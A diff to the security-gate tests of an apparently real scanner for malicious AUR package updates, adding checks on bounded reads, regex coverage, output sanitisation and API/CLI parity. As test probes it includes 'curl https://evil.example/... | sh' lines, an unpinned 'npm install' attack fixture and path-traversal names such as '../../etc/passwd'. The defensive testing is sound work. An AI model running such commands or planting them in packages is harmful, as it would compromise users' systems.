@@ -199,8 +199,17 @@ def gate_network_reads_are_bounded() -> Gate:
     return Gate("every request has a timeout", not hits, hits)
 
 
-def gate_no_archive_extraction() -> Gate:
-    """Nothing an archive contains is ever written to disk by path."""
+def gate_no_path_based_archive_extraction() -> Gate:
+    """No archive member is written to a path the archive chose.
+
+    Narrower than "archives are never extracted", which is what this used
+    to be called, and which was broader than both the check and the truth:
+    the seed importer does write members to disk (``db._extract_v2_archive``),
+    under an explicit containment guard.  What is banned is handing a
+    member's own name to the extractor, because that is the path-traversal
+    primitive; a manual write under a checked name is a different thing and
+    A8 now says so.
+    """
     hits: list[str] = []
     for path in _python_files():
         tree = ast.parse(path.read_text())
@@ -211,7 +220,104 @@ def gate_no_archive_extraction() -> Gate:
                 # write to disk; only path-based extraction is prohibited.
                 if name in ("extract", "extractall", "unpack_archive"):
                     hits.append(f"{_rel(path)}:{node.lineno} {name}()")
-    return Gate("archives are never extracted to disk", not hits, hits)
+    return Gate("no path-based archive extraction", not hits, hits)
+
+
+# The one module whose job is bounded reading, and therefore the only one
+# permitted to call ``read()`` in a loop against a limit.
+_BOUNDED_IO_MODULE = "bounded_io.py"
+
+
+def gate_every_stream_read_is_bounded() -> Gate:
+    """A4/A14: a read with no size is the other end choosing the size.
+
+    Structural over the whole source rather than pointed at the sites that
+    were wrong, because the recurring failure here is a control applied at
+    one of several equivalent call sites.  ``extractfile().read()`` honours
+    the member's declared size, which is the attacker's number: a member
+    declaring thirty gigabytes is allocated in full, and a 32 MiB gzip on
+    compressible content is enough to declare it.  So the bound belongs on
+    the read, and a size argument is what this looks for.
+    """
+    hits: list[str] = []
+    checked = 0
+    for path in _python_files():
+        if path.name == _BOUNDED_IO_MODULE:
+            continue
+        tree = ast.parse(path.read_text())
+        for node in ast.walk(tree):
+            if not isinstance(node, ast.Call):
+                continue
+            if not isinstance(node.func, ast.Attribute) or node.func.attr != "read":
+                continue
+            checked += 1
+            if not node.args and not node.keywords:
+                hits.append(f"{_rel(path)}:{node.lineno} unbounded read()")
+    return Gate("every stream read is bounded", not hits,
+                hits or f"{checked} read() calls, all sized")
+
+
+# Modules that read an artifact somebody handed the operator: a seed, a
+# baseline, an indicator set.  A bare ``read_bytes()``/``read_text()`` in
+# one of these materialises the whole file before any check runs on it.
+_ARTIFACT_MODULES = (
+    "db.py",
+    "ioc_baseline.py",
+    "seed_build.py",
+    "full_aur/export.py",
+)
+
+# Reads of a key file, which is length-checked to 32 bytes at the point of
+# use.  Exempt by name so adding a new bare read to either module fails.
+_ARTIFACT_READ_EXEMPT = {"_load_trusted_pubkey", "sign_artifact"}
+
+
+def _enclosing_functions(tree: ast.AST) -> dict[int, str]:
+    """Map each line to the function whose body contains it."""
+    owner: dict[int, str] = {}
+    for node in ast.walk(tree):
+        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
+            for sub in ast.walk(node):
+                line = getattr(sub, "lineno", None)
+                if line is not None:
+                    owner.setdefault(line, node.name)
+    return owner
+
+
+def gate_artifact_reads_are_bounded() -> Gate:
+    """A4: an artifact is bounded before it is materialised, not after.
+
+    A signature is computed over the bytes, so verification cannot run
+    until they have been read: the bound sits in front of the check, or it
+    guards nothing.  The same applies to a digest recorded for attribution
+    (A12) and to a gzip cap that only ever sees an already-materialised
+    buffer.
+    """
+    problems: list[str] = []
+    covered: list[str] = []
+    for rel in _ARTIFACT_MODULES:
+        path = SRC / rel
+        if not path.exists():
+            problems.append(f"{rel} is missing")
+            continue
+        covered.append(rel)
+        tree = ast.parse(path.read_text())
+        owner = _enclosing_functions(tree)
+        for node in ast.walk(tree):
+            if not isinstance(node, ast.Call):
+                continue
+            if not isinstance(node.func, ast.Attribute):
+                continue
+            if node.func.attr not in ("read_bytes", "read_text"):
+                continue
+            if owner.get(node.lineno) in _ARTIFACT_READ_EXEMPT:
+                continue
+            problems.append(
+                f"{rel}:{node.lineno} unbounded {node.func.attr}() "
+                f"in {owner.get(node.lineno, '<module>')}"
+            )
+    return Gate("artifact reads are bounded before verification", not problems,
+                problems or covered)
 
 
 # An execute() whose SQL is built rather than written is the only way a
@@ -462,6 +568,117 @@ def gate_regex_patterns_pass_adversarial_audit() -> Gate:
     )
 
 
+def gate_every_live_regex_is_audited() -> Gate:
+    """A14: the audit's *coverage*, not just its verdict.
+
+    The audit used to collect ``re.compile("literal")`` out of the AST, so
+    a pattern assembled from parts was skipped in silence: 44 of 246, 18%,
+    concentrated in the modules with the most shared prefixes. A gate that
+    passes because it never looked is the failure this codebase keeps
+    finding, so coverage is asserted rather than assumed.
+    """
+    import importlib
+
+    from scripts.regex_audit import audit_patterns
+
+    audited = {audit.pattern for audit in audit_patterns()}
+
+    missing: list[str] = []
+    for path in sorted(SRC.rglob("*.py")):
+        parts = [
+            part
+            for part in path.relative_to(SRC).with_suffix("").parts
+            if part != "__init__"
+        ]
+        if not parts or parts[0] == "cli" or "__main__" in parts:
+            continue
+        name = "trustsight." + ".".join(parts)
+        try:
+            module = importlib.import_module(name)
+        except Exception:
+            continue
+        for attr, value in vars(module).items():
+            candidates = (
+                [value]
+                if isinstance(value, re.Pattern)
+                else list(value)
+                if isinstance(value, (list, tuple, frozenset, set))
+                else []
+            )
+            for item in candidates:
+                if isinstance(item, re.Pattern) and item.pattern not in audited:
+                    missing.append(f"{name}.{attr}")
+
+    # Rules whose pattern is generated at match time are invisible to all
+    # three collection strategies at once: not a TOML literal, not a
+    # `re.compile("literal")` in the source, and not a module-level
+    # `re.Pattern`. R013 is the FATAL homoglyph rule.
+    import tomllib
+
+    from trustsight.config import DEFAULT_RULES
+    from trustsight.rules import GENERATED_PATTERN_RULES, resolve_generated_patterns
+
+    generated = tomllib.loads(DEFAULT_RULES).get("rules", [])
+    resolve_generated_patterns(generated)
+    for rule in generated:
+        if rule.get("id") in GENERATED_PATTERN_RULES:
+            if rule.get("pattern") not in audited:
+                missing.append(f"generated rule {rule['id']}")
+
+    return Gate(
+        "every live regex is audited",
+        not missing,
+        missing or f"{len(audited)} distinct patterns cover every live object",
+    )
+
+
+def gate_untrusted_text_is_sanitised_where_it_is_rendered() -> Gate:
+    """A1/B7: printed evidence cannot repaint the screen or abort a render.
+
+    `safe_text.clean` is the boundary function. Two render paths used
+    `unicode.strip_ansi` instead, which removes CSI sequences and leaves C1
+    control bytes, BEL and newlines - and `\x9b2J` is the 8-bit spelling of
+    "clear the screen". A third passed federated IOC values to Rich as bare
+    strings, where `[/]` raises `MarkupError` and aborts the whole table.
+
+    Checked on calls and imports rather than on the substring, so a comment
+    explaining the rule does not trip it.
+    """
+    cli = SRC / "cli"
+    problems: list[str] = []
+
+    for path in sorted(cli.rglob("*.py")):
+        text = path.read_text()
+        if re.search(r"\bstrip_ansi\s*\(", text) or re.search(
+            r"^from .*import .*\bstrip_ansi\b", text, re.M
+        ):
+            problems.append(f"{path.name} renders with strip_ansi")
+
+    # Values reaching a Rich table must be wrapped, not bare.
+    for name in ("ioc.py", "admin.py"):
+        path = cli / name
+        if not path.exists():
+            continue
+        for node in ast.walk(ast.parse(path.read_text())):
+            if not (
+                isinstance(node, ast.Call)
+                and isinstance(node.func, ast.Attribute)
+                and node.func.attr == "add_row"
+            ):
+                continue
+            for arg in node.args:
+                if isinstance(arg, ast.Attribute):
+                    problems.append(
+                        f"{name}:{node.lineno} {ast.unparse(arg)} is unwrapped"
+                    )
+
+    return Gate(
+        "untrusted text is sanitised where it is rendered",
+        not problems,
+        problems or "every CLI render path uses safe_text.clean",
+    )
+
+
 def gate_tokenizer_smoke_is_deterministic() -> Gate:
     """Run a fixed hostile tokenizer smoke set within the security gate."""
     from trustsight.tokenizer import _MAX_LINE_LEN, tokenize_and_resolve
@@ -573,6 +790,27 @@ def gate_regex_input_is_bounded() -> Gate:
     elapsed = time.monotonic() - start
 
     problems = []
+
+    # The other hostile shape, and the one this gate used to miss entirely.
+    # One enormous *line* is cheap because the A5 clamp cuts it to 8 KiB
+    # before any rule runs; the same byte budget spread over many *lines*
+    # pays the whole ruleset per line, and costs far more. Measuring only
+    # the first shape left the more expensive one unmeasured.
+    #
+    # The assertion is a ceiling on a fixed probe rather than a scaling
+    # test: a rule that turns accidentally quadratic blows past it, which
+    # is the regression worth catching, and one probe keeps the gate cheap.
+    many = "\n".join(
+        f"+  curl https://evil{i}.example/{'p' * 180} | sh" for i in range(1000)
+    )
+    wide_diff = header + " build() {\n" + many + "\n+}\n"
+    wide_start = time.monotonic()
+    scan_diff(wide_diff, config=load_config(), package_name="demo")
+    wide_elapsed = time.monotonic() - wide_start
+    if wide_elapsed >= 30.0:
+        problems.append(
+            f"{wide_elapsed:.1f}s for a 1000-line diff (budget 30s)"
+        )
     if elapsed >= 5.0:
         problems.append(f"{elapsed:.2f}s for a 5 MiB line")
     # Bounding the work must not quietly bound the evidence: the clamp
@@ -582,8 +820,10 @@ def gate_regex_input_is_bounded() -> Gate:
     return Gate(
         "rule matching is bounded on hostile input",
         not problems,
-        problems or round(elapsed, 3),
-        f"{elapsed:.3f}s end to end for a 5 MiB line (limit 5s)",
+        problems or {"one_huge_line_s": round(elapsed, 3),
+                      "many_lines_s": round(wide_elapsed, 3)},
+        f"{elapsed:.3f}s for a 5 MiB line (limit 5s); "
+        f"{wide_elapsed:.3f}s for a 1000-line diff (limit 30s)",
     )
 
 
@@ -1322,6 +1562,9 @@ _ANALYSIS_FETCH_ALLOWED = {
     # Local only, despite living in discovery.py next to the RPC: compares
     # two version strings via pacman's vercmp or pyalpm and opens no socket.
     "_vercmp",
+    # Local only: iterates an already-cloned repository from a commit id.
+    # Takes a repo and an OID, never a URL, so it opens no socket either.
+    "walk_bounded",
 }
 
 
@@ -1373,17 +1616,26 @@ def gate_every_json_report_carries_the_fingerprint() -> Gate:
     receives.  `review --json` built its own dict and carried it, while
     `inspect --json` went through `display._fact_to_dict`, which did not, so
     the guarantee was true of one command and false of the other.
+
+    Both of those now render through `reporting.report_body` (B11), so that
+    is what this checks: pointing it at the old per-command helper would
+    leave it passing against a function no JSON path calls any more, which
+    is the same mistake in a new place.  `schema.fact_to_dict` is checked
+    beside it because it is the stored `fact_json`, a third consumer.
     """
-    from trustsight.cli.display import _fact_to_dict
     from trustsight.config import config_fingerprint
+    from trustsight.reporting import evaluate_fact, report_body
     from trustsight.schema import fact_to_dict
 
     fact = _demo_fact()
     expected = config_fingerprint()
+    evaluated = evaluate_fact(fact)
     missing = [
         name for name, data in (
-            ("schema.fact_to_dict", fact_to_dict(fact)),
-            ("display._fact_to_dict", _fact_to_dict(fact)),
+            ("schema.fact_to_dict (stored fact_json)", fact_to_dict(fact)),
+            ("reporting.report_body (default)", report_body(evaluated)),
+            ("reporting.report_body (--score)",
+             report_body(evaluated, include_score=True)),
         )
         if data.get("config_fingerprint") != expected
     ]
@@ -1811,13 +2063,29 @@ def gate_score_is_deterministic_under_a_fingerprint() -> Gate:
 # must be a module-level literal: a bound computed from the content is a
 # bound the content controls.
 _BOUND_CONSTANTS = {
-    "rules.py": ["MAX_RULE_LINE_BYTES"],
+    "rules.py": ["MAX_RULE_LINE_BYTES", "MAX_SCANNED_LINES"],
     "tokenizer.py": ["_MAX_EXPANSION_PASSES", "_MAX_VALUE_LEN", "_MAX_LINE_LEN",
                      "_MAX_TABLE_BYTES"],
-    "db.py": ["MAX_SEED_BYTES"],
-    "full_aur/fetch.py": ["MAX_RESPONSE_BYTES", "MAX_TAR_MEMBERS", "_HTTP_TIMEOUT"],
+    "db.py": ["MAX_SEED_BYTES", "MAX_SEED_MEMBER_BYTES"],
+    "differ.py": ["MAX_GENERATED_DIFF_BYTES", "MAX_DIFF_PATCHES",
+                  "MAX_DIFF_SUMMARY_FILES", "MAX_PATCH_BYTES", "MAX_PATCH_SOURCE_BYTES",
+                  "MAX_PKG_BUILD_BYTES", "MAX_COMPANION_TREE_ENTRIES",
+                  "MAX_COMPANION_NAME_BYTES", "MAX_COMPANION_BYTES",
+                  "MAX_COMPANION_FILES", "MAX_DIFF_PATH_BYTES"],
+    "full_aur/fetch.py": ["MAX_RESPONSE_BYTES", "MAX_TAR_MEMBERS",
+                          "MAX_TAR_MEMBER_BYTES", "_HTTP_TIMEOUT"],
     "full_aur/metadata.py": ["MAX_DECOMPRESSED_BYTES", "MAX_RESPONSE_BYTES",
                              "HTTP_TIMEOUT"],
+    "full_aur/export.py": ["MAX_ARTIFACT_BYTES"],
+    "ioc_baseline.py": ["MAX_BASELINE_BYTES", "MAX_BASELINE_ENTRIES"],
+    "seed_build.py": ["MAX_PROVENANCE_BYTES", "MAX_RAW_MAINTAINERS_BYTES"],
+    "bounded_io.py": ["_CHUNK_BYTES"],
+    "buckets.py": ["MAX_HOST_BYTES", "MAX_HOST_LABELS"],
+    "srcinfo.py": ["MAX_SRCINFO_BYTES", "MAX_SRCINFO_LINES",
+                   "MAX_SRCINFO_VALUES_PER_KEY"],
+    "depth.py": ["MAX_DEPTH_LEVELS", "MAX_DEPTH_NODES"],
+    "fetcher.py": ["MAX_TRANSFER_BYTES", "MAX_TOTAL_TRANSFER_BYTES",
+                   "MAX_HISTORY_COMMITS"],
 }
 
 
@@ -2009,6 +2277,611 @@ def gate_doc_lists_every_gate(gates: list[Gate]) -> Gate:
     return Gate(name, not problems, problems)
 
 
+def _parity_fact():
+    """One fact with every reportable feature on it, for the parity gates."""
+    from trustsight.schema import DiffSummary, PackageFact, ScoreEntry
+
+    return PackageFact(
+        package_name="parity",
+        old_version="1.0",
+        new_version="1.1",
+        diff_summary=DiffSummary(
+            files_changed=["PKGBUILD"],
+            file_changes=[{"path": "PKGBUILD", "status": "modified"}],
+        ),
+        score_breakdown=[
+            ScoreEntry(rule_id="R001", severity="CRITICAL", weight=40,
+                       reason="curl piped to bash", file="PKGBUILD", line=4),
+        ],
+        final_score=40,
+        risk="Critical",
+        coverage_gaps=["line_truncated"],
+        changes=["PKGBUILD modified"],
+        suppressed_rules=[{"rule_id": "R099", "severity": "LOW"}],
+    )
+
+
+def gate_api_and_cli_emit_the_same_body() -> Gate:
+    """The API's JSON is the CLI's JSON: same keys, same values.
+
+    Three surfaces used to build three bodies - ``review --json``,
+    ``inspect --json`` and ``Report.to_dict()`` - with two naming
+    conventions between them, and the API body carried no ``findings`` at
+    all while its docstring claimed to be what the CLI writes. A consumer
+    could be written against one path and silently miss evidence on
+    another.
+
+    Exercised through the surfaces a caller actually reaches, not through
+    ``report_body`` directly: calling the shared helper twice would prove
+    only that it equals itself, which is exactly the narrow-call mistake
+    ``contributing/security-review.md`` catalogues.
+    """
+    from trustsight.api import _report_from_fact
+    from trustsight.reporting import REPORT_KEYS, evaluate_fact, report_body
+
+    fact = _parity_fact()
+    evaluated = evaluate_fact(fact)
+    problems = []
+
+    cli = report_body(evaluated)
+    api = _report_from_fact(fact).to_dict()
+    if set(cli) != set(api):
+        problems.append(
+            f"key sets differ: cli-only={sorted(set(cli) - set(api))} "
+            f"api-only={sorted(set(api) - set(cli))}"
+        )
+    for key in sorted(set(cli) & set(api)):
+        if cli[key] != api[key]:
+            problems.append(f"{key}: cli={cli[key]!r} api={api[key]!r}")
+
+    missing = sorted(set(REPORT_KEYS) - set(api))
+    if missing:
+        problems.append(f"REPORT_KEYS absent from the body: {missing}")
+
+    # Never skipping info: the evidence a run produced must reach the body.
+    if evaluated["findings"] and not api.get("findings"):
+        problems.append("findings were produced but the body carries none")
+
+    for flags in ({"include_score": True}, {"verbose": True},
+                  {"include_score": True, "verbose": True}):
+        if report_body(evaluated, **flags) != _report_from_fact(fact).to_dict(**flags):
+            problems.append(f"bodies differ under {flags}")
+
+    return Gate("the API and CLI emit the same JSON body", not problems,
+                problems or sorted(api))
+
+
+def gate_score_is_withheld_by_default() -> Gate:
+    """The aggregate numbers are available on request, never volunteered.
+
+    The terminal guarantee ("the default output is not headline-shaped")
+    only holds for a machine consumer if the JSON bodies obey it too, and
+    ``inspect --json`` used to volunteer ``score``, ``risk`` and
+    ``risk_label`` on every call regardless of the flags - so the number the
+    CLI is documented to withhold was one flag away from being the default
+    for every consumer.
+
+    Attribute access is deliberately not covered: ``report.score`` is the
+    caller naming the field, which is the request.
+    """
+    from trustsight.api import _report_from_fact
+    from trustsight.reporting import SCORE_KEYS, VERBOSE_KEYS, evaluate_fact, report_body
+
+    fact = _parity_fact()
+    evaluated = evaluate_fact(fact)
+    problems = []
+
+    surfaces = {
+        "cli": (report_body(evaluated),
+                report_body(evaluated, include_score=True),
+                report_body(evaluated, verbose=True)),
+        "api": (_report_from_fact(fact).to_dict(),
+                _report_from_fact(fact).to_dict(include_score=True),
+                _report_from_fact(fact).to_dict(verbose=True)),
+    }
+    for name, (default, scored, verbose) in surfaces.items():
+        for key in SCORE_KEYS:
+            if key in default:
+                problems.append(f"{name}: {key} present by default")
+            if key not in scored:
+                problems.append(f"{name}: {key} missing when requested")
+        for key in VERBOSE_KEYS:
+            if key in default:
+                problems.append(f"{name}: {key} present by default")
+            if key not in verbose:
+                problems.append(f"{name}: {key} missing under verbose")
+        # A weight is score arithmetic and travels with the breakdown.
+        for finding in default.get("findings", ()):
+            if "weight" in finding:
+                problems.append(f"{name}: a default finding carries a weight")
+                break
+
+    # The evidence keys are the other half: withholding the score must not
+    # withhold anything else.
+    for name, (default, _s, _v) in surfaces.items():
+        for key in ("findings", "coverage_gaps", "suppressed_rules", "verdict"):
+            if key not in default:
+                problems.append(f"{name}: {key} missing from the default body")
+
+    return Gate("the score is withheld from every default body", not problems,
+                problems or list(SCORE_KEYS))
+
+
+# Analysis entry points the CLI uses.  The API must reach the package
+# through these and define no pipeline of its own, or "same mechanisms,
+# different output form" stops being true.
+_SHARED_ANALYSIS = {
+    "analyze_outdated_batch", "discover_packages",     # review
+    "analyze_package",                                 # inspect
+    "analyze_package_text",                            # text / corpus
+    "evaluate_fact", "evaluate_review_row", "report_body",
+}
+
+
+def gate_api_and_cli_share_the_analysis() -> Gate:
+    """The API and CLI differ in output form, not in what they compute.
+
+    Structural: the API must import its analysis from the same modules the
+    CLI does. A second implementation would be free to drift - different
+    rules, a different score, a different notion of coverage - while every
+    behavioural parity check kept passing on the surface it happened to
+    exercise.
+    """
+    api = SRC / "api.py"
+    tree = ast.parse(api.read_text())
+    imported: set[str] = set()
+    modules: set[str] = set()
+    for node in ast.walk(tree):
+        if isinstance(node, ast.ImportFrom) and node.module:
+            modules.add(node.module)
+            for alias in node.names:
+                imported.add(alias.name)
+
+    problems = []
+    reached = sorted(_SHARED_ANALYSIS & imported)
+    if not reached:
+        problems.append("api.py imports none of the shared analysis entry points")
+    # The scoring model in particular must not be re-derived here.
+    for banned in ("calculate_score", "apply_rules", "risk_level"):
+        if banned in imported:
+            problems.append(f"api.py imports {banned}: scoring belongs to the engine")
+    # A rule engine or differ reached directly would be a parallel pipeline.
+    for module in sorted(modules):
+        if module.endswith(("rules", "differ", "tokenizer")):
+            problems.append(f"api.py imports {module} directly")
+
+    return Gate("the API and CLI share one analysis", not problems,
+                problems or reached)
+
+
+def gate_unpinned_build_deps_is_a_declared_gap() -> Gate:
+    """B2/A14: a build the analysis could not read is a declared gap.
+
+    ``makepkg`` verifies ``source=()`` against ``sha256sums`` and verifies
+    nothing a build step resolves from a registry, so the code that will
+    execute is not in the analysed text.  The June 2026 AUR campaign is that
+    situation exactly, and it scored 15/100 - UNFLAGGED - against a database
+    with a normal corpus before this gap existed.
+
+    Deliberately not a scored rule: ``npm install`` in a build function is
+    ordinary AUR practice, which is why R081 is scoped to install hooks and
+    why a calibration gate keeps it there.  The gap claims nothing about the
+    package; it records that a sensor was missing, and B2 then forbids the
+    run from reading as clean.
+    """
+    from trustsight.analysis.buildfetch import has_unpinned_build_deps
+    from trustsight.coverage import UNPINNED_BUILD_DEPS, fail_closed, gaps_from
+
+    attack = (
+        "diff --git a/PKGBUILD b/PKGBUILD\n"
+        " prepare() {\n"
+        "+  npm install atomic-lockfile\n"
+        " }\n"
+    )
+    quiet = (
+        "diff --git a/PKGBUILD b/PKGBUILD\n"
+        "+# npm install atomic-lockfile\n"
+        '+echo "npm install atomic-lockfile"\n'
+    )
+    offline = (
+        "diff --git a/PKGBUILD b/PKGBUILD\n"
+        " build() {\n"
+        "+  cargo build --offline\n"
+        " }\n"
+    )
+
+    problems = []
+    if not has_unpinned_build_deps(attack):
+        problems.append("a build-time registry resolution did not record the gap")
+    if has_unpinned_build_deps(quiet):
+        problems.append("a name in a comment or string recorded the gap")
+    if has_unpinned_build_deps(offline):
+        problems.append("an explicitly offline build recorded the gap")
+
+    gaps = gaps_from(tree_analyzed=True, unpinned_build_deps=True)
+    if UNPINNED_BUILD_DEPS not in gaps:
+        problems.append("gaps_from does not carry the gap")
+    if fail_closed("Low", gaps, []) != "Inconclusive":
+        problems.append("the gap does not forbid an unflagged verdict")
+
+    return Gate("an unpinned build dependency is a declared gap", not problems,
+                problems or UNPINNED_BUILD_DEPS)
+
+
+def gate_every_render_reports_the_same_information() -> Gate:
+    """B11 on the terminal: a render may not drop what the JSON carries.
+
+    The body gates above compare JSON with JSON.  A reviewer reads whichever
+    render their terminal gave them, so a field present in one and absent
+    from another is a difference in *information* between two surfaces, and
+    B2, B5 and B7 each say the field in question may never be dropped.
+
+    All four renderers, looped rather than sampled, because every one of the
+    three properties was in fact false on some surface: `inspect` showed
+    nothing about a coverage gap unless a band was requested, `review`
+    showed suppressions only in its JSON body, and `inspect --plain` had no
+    change summary at all. Each had a gate already, and each gate was aimed
+    at the data layer where the value is set rather than at the renders that
+    have to show it.
+    """
+    import contextlib
+
+    from rich.console import Console
+
+    import trustsight.cli.display as display
+    import trustsight.cli.inspect as inspect_cli
+    import trustsight.cli.review as review_cli
+    from trustsight.coverage import GAP_REASONS
+    from trustsight.depth import DependencyReport
+    from trustsight.reporting import evaluate_fact
+    from trustsight.schema import DiffSummary, PackageFact, ScoreEntry
+
+    gap = "diff_truncated"
+    change = "PKGBUILD moved"
+    suppressed = "R099"
+    dependency = "render-parity-dep"
+    fact = PackageFact(
+        package_name="render-parity", old_version="1.0", new_version="1.1",
+        diff_summary=DiffSummary(1, 0, ["PKGBUILD"],
+                                 [{"path": "PKGBUILD", "status": "modified"}]),
+        score_breakdown=[ScoreEntry(rule_id="R001", severity="HIGH", weight=25,
+                                    reason="curlpipe", file="PKGBUILD", line=4)],
+        final_score=25, risk="Medium", coverage_gaps=[gap], changes=[change],
+        suppressed_rules=[{"rule_id": suppressed, "severity": "LOW",
+                           "override_reason": "known"}],
+        dependencies=[DependencyReport(name=dependency, depth=1, score=40,
+                                       risk="High", risk_label="High",
+                                       finding_count=1)],
+    )
+    row = dict(evaluate_fact(fact))
+    row["failed"] = False
+
+    def rich(fn) -> str:
+        buffer = io.StringIO()
+        saved = display._console
+        display._console = Console(file=buffer, force_terminal=False, width=240)
+        try:
+            fn()
+        finally:
+            display._console = saved
+        return buffer.getvalue()
+
+    def plain(fn) -> str:
+        buffer = io.StringIO()
+        with contextlib.redirect_stdout(buffer):
+            fn()
+        return buffer.getvalue()
+
+    renders = {
+        "review rich": rich(lambda: review_cli._render_results_rich(
+            [row], 1, False, False, False, False)),
+        "review plain": plain(lambda: review_cli._render_results_plain(
+            [row], 1, False, False, False, False)),
+        "inspect rich": rich(lambda: inspect_cli._inspect_rich(fact)),
+        "inspect plain": plain(lambda: inspect_cli._inspect_plain(fact)),
+    }
+
+    required = {
+        "the coverage gap (B2)": (GAP_REASONS[gap], gap),
+        "the suppressed rule (B5)": (suppressed,),
+        "the change summary (B7)": (change,),
+        # A dependency is a full analysis with its own band, so a surface
+        # that hides it is hiding a result and not a detail.
+        "the analysed dependency (depth)": (dependency,),
+    }
+    problems = []
+    for name, out in renders.items():
+        for what, tokens in required.items():
+            if not any(token in out for token in tokens):
+                problems.append(f"{name} does not report {what}")
+
+    return Gate("every render reports the same information", not problems,
+                problems or sorted(renders))
+
+
+def gate_generated_diff_is_bounded_before_assembly() -> Gate:
+    """A4: the diff generator bounds what it allocates, not what it keeps.
+
+    ``patch.text`` materialises a whole patch, and the git path used to call
+    ``generate_diff`` with no ``max_bytes`` at all - so every filtered patch
+    was read in full and joined before the pipeline's cap applied, and
+    ``MAX_GENERATED_DIFF_BYTES`` was inert on the path that matters.
+
+    The second half is the one that hides things. A patch the generator
+    declines to retain leaves the assembled text at or under the cap, so a
+    caller that re-derives truncation by measuring that text reports
+    "complete" while content was skipped - the silent skip B2 forbids. The
+    flag therefore travels out of the generator rather than being inferred,
+    and this checks that it does.
+    """
+    import inspect
+
+    from trustsight import differ
+    from trustsight.analysis import pipeline
+
+    problems = []
+
+    # The bounded form must return the flag.
+    signature = inspect.signature(differ.generate_diff_bounded)
+    source = inspect.getsource(differ.generate_diff_bounded)
+    if "-> tuple[str, DiffSummary, bool]" not in str(signature.return_annotation) + source:
+        problems.append("generate_diff_bounded does not declare a truncation flag")
+    for name in ("MAX_DIFF_PATCHES", "MAX_PATCH_BYTES", "MAX_DIFF_SUMMARY_FILES"):
+        if name not in source:
+            problems.append(f"{name} is not enforced in generate_diff_bounded")
+
+    # The bound that matters runs *before* `patch.text`, because that
+    # attribute has already allocated the whole patch by the time it
+    # returns. Asserted behaviourally: a delta whose text raises if touched
+    # must still produce a result and a truncation flag.
+    if "MAX_PATCH_SOURCE_BYTES" not in source:
+        problems.append("delta size is not checked before patch.text")
+
+    touched = []
+
+    class _Side:
+        def __init__(self, size):
+            self.path, self.size = "PKGBUILD", size
+
+    class _Delta:
+        status = 1
+
+        def __init__(self, size):
+            self.old_file = _Side(size)
+            self.new_file = _Side(size)
+
+    class _Exploding:
+        def __init__(self, size):
+            self.delta = _Delta(size)
+
+        @property
+        def text(self):
+            touched.append(True)
+            raise AssertionError("patch text read before the size check")
+
+    huge = differ.MAX_PATCH_SOURCE_BYTES * 4
+
+    class _Diff:
+        deltas = [_Delta(huge)]
+        stats = type("S", (), {"insertions": 0, "deletions": 0})()
+
+        def __iter__(self):
+            return iter([_Exploding(huge)])
+
+    class _Repo:
+        def get(self, _oid):
+            return type("C", (), {"tree": object()})()
+
+        def diff(self, *_a, **_k):
+            return _Diff()
+
+    try:
+        _text, _summary, flag = differ.generate_diff_bounded(_Repo(), "a", "b")
+    except AssertionError:
+        problems.append("an oversized delta had its text requested")
+    else:
+        if touched:
+            problems.append("an oversized delta had its text requested")
+        if flag is not True:
+            problems.append("skipping an oversized delta set no truncation flag")
+
+    # The pipeline must consume the flag rather than re-deriving truncation.
+    git_path = inspect.getsource(pipeline.analyze_package)
+    if "generate_diff_bounded" not in git_path:
+        problems.append("the git path does not use the bounded generator")
+    if "generated_truncated" not in git_path:
+        problems.append("the git path drops the generator's truncation flag")
+
+    return Gate("generated diff is bounded before assembly", not problems,
+                problems or ["MAX_DIFF_PATCHES", "MAX_PATCH_BYTES",
+                             "MAX_DIFF_SUMMARY_FILES"])
+
+
+def gate_companion_reads_are_bounded_before_data() -> Gate:
+    """A4: a companion blob's size is checked before its bytes are read.
+
+    ``blob.data`` materialises the whole blob. The companion loop already
+    checked size first; the PKGBUILD read that *drives* companion discovery
+    did not, so the one blob guaranteed to exist was the one read unbounded.
+    The tree walk that selects companions was likewise unbounded, because the
+    per-file cap applies to the set it produces rather than to the walk.
+    """
+    import ast
+    import inspect
+
+    from trustsight import differ
+
+    problems = []
+    source = inspect.getsource(differ.companion_source_hunks)
+    for name in ("MAX_PKG_BUILD_BYTES",):
+        if name not in source:
+            problems.append(f"{name} is not enforced in companion_source_hunks")
+    if ".data" in source and "size" not in source:
+        problems.append("blob data is read without a size check")
+
+    names_source = inspect.getsource(differ._companion_names)
+    if "MAX_COMPANION_TREE_ENTRIES" not in names_source:
+        problems.append("the companion tree walk is unbounded")
+    if "_is_safe_companion_name" not in names_source:
+        problems.append("companion names are not validated")
+
+    # A name carrying path structure must be refused.
+    for hostile in ("../../etc/passwd", "/etc/passwd", "a" * 4096, "", ".."):
+        if differ._is_safe_companion_name(hostile):
+            problems.append(f"accepted a hostile companion name: {hostile[:24]!r}")
+
+    # Every bound is a literal, which the constants gate also checks; this
+    # confirms they exist on the module at all.
+    tree = ast.parse(inspect.getsource(differ))
+    assigned = {t.id for node in tree.body if isinstance(node, ast.Assign)
+                for t in node.targets if isinstance(t, ast.Name)}
+    for name in ("MAX_PKG_BUILD_BYTES", "MAX_COMPANION_TREE_ENTRIES",
+                 "MAX_COMPANION_NAME_BYTES"):
+        if name not in assigned:
+            problems.append(f"{name} is not a module-level constant")
+
+    return Gate("companion reads are bounded before data", not problems,
+                problems or ["MAX_PKG_BUILD_BYTES", "MAX_COMPANION_TREE_ENTRIES",
+                             "MAX_COMPANION_NAME_BYTES"])
+
+
+def gate_a_critical_finding_never_reads_medium() -> Gate:
+    """A confirmed CRITICAL is not a medium situation, whatever the sum says.
+
+    CRITICAL weighs 40 and the High band opens at 51, so arithmetic alone
+    can never lift a *single* CRITICAL above Medium: a lone fork bomb, a
+    lone `rm -rf /`, a lone `curl | bash` all total 40. Severity overriding
+    arithmetic is the existing shape rather than a new one - B4 already lets
+    a FATAL cap the score at 100 regardless of the total - and the floor
+    moves the band only, so the calibrated separation between the benign and
+    malicious *score* populations is untouched.
+
+    Checked through ``calculate_score`` rather than the helper, because the
+    band a caller receives is the property, and the floor has to survive the
+    cold-start and fail-closed passes that run after it.
+    """
+    from trustsight.config import load_config
+    from trustsight.schema import NoveltyContext
+    from trustsight.scoring import CRITICAL_BAND_FLOOR, calculate_score, risk_level
+
+    config = load_config()
+    warm = NoveltyContext(observation_count=999)
+    problems = []
+
+    lone = [{"rule_id": "R001", "severity": "CRITICAL", "name": "x", "match": "y"}]
+    score, _breakdown, level = calculate_score(lone, {}, warm, config)
+    if risk_level(score) != "Medium":
+        problems.append(f"fixture drift: a lone CRITICAL now totals {score}")
